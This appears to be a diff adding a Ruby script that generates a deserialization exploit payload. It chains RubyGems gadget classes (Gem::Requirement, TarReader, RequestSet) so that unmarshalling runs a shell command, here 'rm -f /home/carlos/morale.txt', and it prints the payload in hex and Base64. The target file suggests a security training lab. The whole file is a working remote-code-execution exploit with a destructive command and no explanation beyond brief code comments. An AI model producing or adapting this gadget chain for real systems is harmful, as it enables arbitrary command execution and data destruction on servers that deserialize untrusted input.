@@ -1,0 +1,48 @@
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+# Create a dummy object for Net::WriteAdapter
+class DummyWriteAdapter
+  def initialize(*); end
+end
+
+wa1 = DummyWriteAdapter.new
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm -f /home/carlos/morale.txt")
+
+# Create a dummy object for Net::BufferedIO
+class DummyBufferedIO
+  def initialize(*); end
+end
+
+n = DummyBufferedIO.new
+n.instance_variable_set('@debug_output', rs)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts payload.inspect
+
+puts "Payload (hex):"
+puts payload.unpack('H*')[0]
+puts
+
+require "base64"
+puts "Payload (Base64 encoded):"
+puts Base64.encode64(payload)
